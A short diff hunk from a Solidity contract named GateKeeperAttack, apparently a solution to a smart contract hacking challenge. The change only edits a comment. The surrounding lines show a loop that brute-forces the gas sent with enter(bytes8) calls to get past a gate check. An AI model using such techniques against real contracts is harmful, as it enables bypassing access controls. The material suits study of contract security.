@@ -34,7 +34,7 @@ contract GateKeeperAttack {
 
 
     
-        //Applying brute force until we get a `true` result 
+        //*Applying brute force until we get a `true` result 
 
         for(uint256 i = 0; i < 120; i++){
           (bool result ,) = address(gateKeeperInstance).call{gas: i + 150 + 8191 * 3}(abi.encodeWithSignature("enter(bytes8)", gateKey));
